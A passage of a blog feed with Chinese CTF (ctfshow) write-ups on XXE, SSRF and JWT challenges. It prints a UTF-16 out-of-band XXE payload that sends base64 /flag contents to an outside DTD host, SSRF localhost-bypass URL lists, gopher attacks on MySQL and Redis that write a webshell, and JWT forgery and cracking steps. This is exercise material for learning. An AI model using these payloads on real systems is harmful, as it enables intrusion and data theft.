class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>这里是把xml和http都给过滤掉了，那么我们就可以利用python进行编码发包</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">] &gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">requests.post(url ,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为xml支持utf-16编码，所以我们就可以进行utf-16进行编码</p><h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>题目</p><p><img src="../images/image-20230123231807557.png" alt="image-20230123231807557"></p><p>一个xxe的登录，尝试一下弱口令登录，admin/admin   登录成功，没有显示什么，那么我们就可以进行抓包查看。</p><p><img src="../images/image-20230123231949046.png" alt="image-20230123231949046"></p><p>然后就可以进行xxe注入了，这种类型的题目是最经典的，网上有一模一样的。</p><p><img src="../images/image-20230123232139774.png" alt="image-20230123232139774"></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>这个show讲的xxe类型比较少，想看更详细的可以去看文章开头给的那两篇文章</p><p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡  PHP版本并不影响XXE利用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;xxe的解释  —-&amp;gt;   &lt;a href=&quot;https://xz.aliyun.com/t/3357#toc-24&quot;&gt;这篇文章&lt;/a&gt;   —-&amp;gt;讲的比较详细了，几乎覆盖了xxe的所有攻击方法&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://security.</summary>
      
    
    
    
    
    <category term="xxe ctfshow 刷题记录xxe" scheme="https://ke1nys.github.io/tags/xxe-ctfshow-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95xxe/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-SSRF 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/f917f043.html"/>
    <id>https://ke1nys.github.io/posts/f917f043.html</id>
    <published>2023-01-20T08:04:11.000Z</published>
    <updated>2023-01-22T15:27:33.593Z</updated>
    
    <content type="html"><![CDATA[<p>可以通过这篇文章来了解一下啥是SSRF  ——&gt;   <a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p>(觉得写的不好的话可以自己去网上搜，网上挺多人写的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以下内容摘自这篇文章 https://blog.csdn.net/q20010619/article/details/120536552</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSRF基础</span><br><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">相关函数和类</span><br><span class="line"></span><br><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中</span><br><span class="line">readfile()：输出一个文件的内容</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用</span><br><span class="line">fopen()：打开一个文件文件或者 URL</span><br><span class="line">PHP原生类SoapClient在触发反序列化时可导致SSRF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相关协议</span><br><span class="line"></span><br><span class="line">file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</span><br><span class="line">dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</span><br><span class="line">gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</span><br><span class="line">http/s协议：探测内网主机存活</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用方式</span><br><span class="line"></span><br><span class="line">1.让服务端去访问相应的网址</span><br><span class="line"></span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line"></span><br><span class="line">3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</span><br><span class="line"></span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line"></span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line"></span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有端口开放</span><br><span class="line"></span><br><span class="line">7.DoS攻击（请求大文件，始终保持连接keep-alive always）</span><br></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>题目</p><p><img src="../images/image-20230120160711692.png" alt="image-20230120160711692"></p><p><strong>ssrf题的关键词就是curl</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*# curl_init — 初始化 cURL 会话*    </span><br><span class="line">*# curl_setopt — 设置一个cURL传输选项* </span><br><span class="line">*# curl_exec — 执行 cURL 会话* </span><br><span class="line">*# curl_close — 关闭 cURL 会话*</span><br></pre></td></tr></table></figure><p>这里扫一下目录可以发现存在flag.php这个文件</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">或者使用 file 伪协议去读取文件</span><br><span class="line">post: url=file:///var/www/html/flag.php 查看源码</span><br></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>题目</p><p><img src="../images/image-20230120161950493.png" alt="image-20230120161950493"></p><p>过滤了一下，但是等于没过滤。。。。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.0.0.1/flag.php</span><br><span class="line">url=http://127.0.1/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">(转进制的方法也可以  ---&gt; 2进制  16进制  8进制都可以)</span><br></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><p>题目</p><p><img src="../images/image-20230120162659628.png" alt="image-20230120162659628"></p><p>增加了新过滤</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">十进制整数：url=http://2130706433/flag.php</span><br><span class="line">十六进制：url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制：url=http://0177.0.0.1/flag.php</span><br><span class="line">十六进制整数：url=http://0x7F000001/flag.php</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>题目</p><p><img src="../images/image-20230120163438468.png" alt="image-20230120163438468"></p><p>把1  0  都给过滤掉了。</p><p><strong>解法一</strong></p><p>使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p><p><strong>解法二</strong></p><p>302跳转  —-&gt;  题目出现<strong>parse_url</strong>时可以用    (<strong>我猜的</strong>)   仅供参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php中，302不是错误，而是HTTP响应状态码，意思为“临时重定向”，表示被访问页面因为各种需要被临时跳转到其他页面；可利用header()来实现302跳转，语法“header(&#x27;Location: 跳转url&#x27;,true,302)”。</span><br></pre></td></tr></table></figure><p>就是在自己的vps上搭建一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure><p><strong>解法三</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自己去ceye.io注册绑定127.0.0.1然后记得前面加r</span><br><span class="line"></span><br><span class="line">url=http://r.xxxzc8.ceye.io/flag.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120164945293.png" alt="image-20230120164945293"></p><p>如果自己的Identifier里有0或者1的话就用不了了。</p><p><img src="../images/image-20230120165033153.png" alt="image-20230120165033153"></p><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p>题目</p><p><img src="../images/image-20230120165540423.png" alt="image-20230120165540423"></p><p>这里的话长度给了限制，就是长度小于5</p><p>这里先了解一下<code>parse_url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</span><br><span class="line">数组中可能的键有以下几种：</span><br><span class="line">scheme - 如 http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - 在问号 ? 之后</span><br><span class="line">fragment - 在散列符号 # 之后</span><br><span class="line">    </span><br><span class="line"># 例：</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># 输出</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>题目</p><p><img src="../images/image-20230120165847080.png" alt="image-20230120165847080"></p><p>这里的话是限制长度到3位了</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line"># 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</span><br></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><p>题目</p><p><img src="../images/image-20230120170031431.png" alt="image-20230120170031431"></p><p>我们先来分析一下上图中出现的函数的意思</p><p><strong>先来看下 gethostbyname 函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostbyname — 返回主机名对应的 IPv4地址</span><br></pre></td></tr></table></figure><p><strong>filter_var()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># php filter函数</span><br><span class="line">filter_var()获取一个变量，并进行过滤</span><br><span class="line">filter_var_array()获取多个变量，并进行过滤</span><br><span class="line">......</span><br><span class="line"># PHP 过滤器</span><br><span class="line">FILTER_VALIDATE_IP把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围</span><br><span class="line">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</span><br><span class="line">FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</span><br></pre></td></tr></table></figure><p>因为代码中使用了 gethostbyname 获取了真实 IP 地址，所以域名指向方法不能再使用，可以使用 302 跳转方法和 dns rebinding 方法</p><p>DNS rebinding（DNS重新绑定攻击）</p><p>攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略</p><p>回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP</p><p><img src="../images/image-20230120172635780.png" alt="image-20230120172635780"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://r.自己的域名.ceye.io/flag.php</span><br><span class="line"># 注意前边要加上r.</span><br><span class="line"># 多次尝试</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120174137568.png" alt="image-20230120174137568"></p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><p>题目</p><p><img src="../images/image-20230120174311310.png" alt="image-20230120174311310"></p><p>url 字符串要以 <code>http://ctf</code>开头，<code>show</code>结尾</p><p>这里在讲一遍这个<code>parse_url</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</span><br><span class="line">数组中可能的键有以下几种：</span><br><span class="line">scheme - 如 http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - 在问号 ? 之后</span><br><span class="line">fragment - 在散列符号 # 之后</span><br><span class="line">    </span><br><span class="line"># 例：</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># 输出</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是根据这个函数的特性来获取flag</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><h2 id="web359-打无密码的mysql"><a href="#web359-打无密码的mysql" class="headerlink" title="web359(打无密码的mysql)"></a>web359(打无密码的mysql)</h2><p>题目</p><p><img src="../images/image-20230120180442260.png" alt="image-20230120180442260"></p><p><img src="../images/image-20230120180638216.png" alt="image-20230120180638216"></p><p>点击login抓包发现存在returl这个东西，后面还跟着http网址，所以猜测是ssrf</p><p>工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p><p>使用 gopher 协议去打 mysql</p><p>用 gopherus 工具生成 payload</p><p>使用方法可以自己去看，这里的话不知道什么原因，我python用不了,就直接用下面的语句了</p><p><img src="../images/image-20230120230529676.png" alt="image-20230120230529676"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopherus --exploit mysql</span><br></pre></td></tr></table></figure><p>记得得把_后面的url编码在进行一次编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）   然后进行抓包发送，然后在访问2.php进行rce</p><p><img src="../images/image-20230120230800699.png" alt="image-20230120230800699"></p><p><img src="../images/image-20230120230910057.png" alt="image-20230120230910057"></p><h2 id="web360-Redis"><a href="#web360-Redis" class="headerlink" title="web360(Redis)"></a>web360(Redis)</h2><p>题目</p><p><img src="../images/image-20230121163014199.png" alt="image-20230121163014199"></p><p>代码其实和前面的常规ssrf题差不多</p><p>对redis的介绍 —-&gt;   <a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">https://www.cnblogs.com/powertoolsteam/p/redis.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">什么是Redis未授权访问？</span><br><span class="line"></span><br><span class="line">Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</span><br><span class="line"></span><br><span class="line">简单说，漏洞的产生条件有以下两点：</span><br><span class="line"></span><br><span class="line">redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</span><br><span class="line">没有设置密码认证（一般为空），可以免密码远程登录redis服务</span><br></pre></td></tr></table></figure><p>对redis进行操作得用到dict协议  —-&gt;   <strong>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</strong></p><p><img src="../images/image-20230121163628812.png" alt="image-20230121163628812"></p><p>出现这种情况说明存在redis服务。</p><p>这里就直接可以利用gopherus工具，这个工具可以生成多种payload</p><p><img src="../images/image-20230121163810218.png" alt="image-20230121163810218"></p><p>这道题就直接生成payload拿来打就行了。</p><p><img src="../images/image-20230121170818566.png" alt="image-20230121170818566"></p><p>然后将_后面的语句进行url编码就行了，post后，访问shell.php,然后进行rce就行了。</p><p><img src="../images/image-20230121171016810.png" alt="image-20230121171016810"></p><p>出现这种情况就是shell写入成功，然后进行rce就行了。</p><p>这篇文章的话写的很好在结尾的话给了一些补充 —&gt; <a href="https://blog.csdn.net/q20010619/article/details/120536552">https://blog.csdn.net/q20010619/article/details/120536552</a></p><p>可以自己去参考一下</p><p>这篇文章的话概括了几乎全部的SSRF攻击内容  ——-&gt;   <a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以通过这篇文章来了解一下啥是SSRF  ——&amp;gt;   &lt;a href=&quot;https://websec.readthedocs.io/zh/latest/vuln/ssrf.html&quot;&gt;https://websec.readthedocs.io/zh/latest/vu</summary>
      
    
    
    
    
    <category term="SSRF ctfshow 刷题记录" scheme="https://ke1nys.github.io/tags/SSRF-ctfshow-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-JWT 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/f8d4789.html"/>
    <id>https://ke1nys.github.io/posts/f8d4789.html</id>
    <published>2023-01-19T08:12:37.000Z</published>
    <updated>2023-01-20T07:56:52.138Z</updated>
    
    <content type="html"><![CDATA[<p>JWT —-&gt;<a href="https://zhuanlan.zhihu.com/p/86937325">https://zhuanlan.zhihu.com/p/86937325</a></p><p>可以去看看这篇文章了解一下啥是JWT(如果觉得不好，可以自己去搜一下，网上挺多人讲的这个)</p><p>jwt解密网站<code>https://jwt.io/</code></p><p>前置知识<br>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。<br>设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</p><p>这篇文章介绍了jwt和其的几种攻击方法  —-&gt;  <a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p><p>这篇文章几乎概括了所有的jwt攻击的方法  —-&gt;  <a href="https://www.cnblogs.com/HelloCTF/p/15748380.html">https://www.cnblogs.com/HelloCTF/p/15748380.html</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>题目</p><p><img src="../images/image-20230119164512413.png" alt="image-20230119164512413"></p><p>然后查看源代码发现了提示。</p><p><img src="../images/image-20230119164723959.png" alt="image-20230119164723959"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里说一下url/admin    和  url/admin/的区别</span><br><span class="line">前者是访问admin这个文件   后者是访问amdin目录下的index.php or  index.jsp  index.aspx</span><br></pre></td></tr></table></figure><p>payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去访问/admin/然后就把cookie拿出来进行base64解码，然后把user修改成admin，在进行base64编码，然后重新提交cookie到/admin/，就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>题目<img src="../images/image-20230119165715347.png" alt="image-20230119165715347"></p><p><img src="../images/image-20230119195246730.png" alt="image-20230119195246730"></p><p>拿着cookie去jwt.io解密平台查看了一下，发现是存在HS256加密的，那么我们就得去想办法获得密钥了。</p><p>然后盲猜一下是123456，结果对了，然后访问/admin/就能拿到flag了。(还是得把user修改成admin)</p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>题目</p><p><img src="../images/image-20230119195558015.png" alt="image-20230119195558015"></p><p>还是这个玩意</p><p>还是和web348一样，直接猜密码是123456.</p><p>然后就可以解出来了。</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>题目</p><p><img src="../images/image-20230119200532621.png" alt="image-20230119200532621"></p><p>利用jwt爆破攻击爆破<br>下载地址<code>https://github.com/brendan-rius/c-jwt-cracker</code>具体安装方法文档中有。<br>使用方法 <code>./jwtcrack jwt</code></p><p><img src="../images/image-20230119202324686.png" alt="image-20230119202324686"></p><p>跑半天才给我跑出来</p><p><img src="../images/image-20230119202436473.png" alt="image-20230119202436473"></p><p>然后就去修改cookie访问/admin/就可以拿到flag了。</p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p><img src="../images/image-20230119203323957.png" alt="image-20230119203323957"></p><p>这里拿到cookie去访问的话，得到这里是RS256加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</span><br></pre></td></tr></table></figure><p>利用私钥生成jwt，利用公钥解密jwt，所以我们只要有私钥然后自己重新生成就可以了。<br>访问/private.key得到私钥  这里的考点就是私钥泄露</p><p><img src="../images/image-20230119205202772.png" alt="image-20230119205202772"></p><p>这里给的是题目的源码。</p><p><strong>解法</strong></p><p><img src="../images/image-20230119205933972.png" alt="image-20230119205933972"></p><p>先创建一个public目录</p><p>然后进入新建的route目录，修改一下源码，把题目给的源码复制进去。(注意把user改成admin)</p><p><img src="../images/image-20230119210233365.png" alt="image-20230119210233365"></p><p>然后把题目上的private.key下载到public目录</p><p><img src="../images/image-20230119210443791.png" alt="image-20230119210443791"></p><p><a 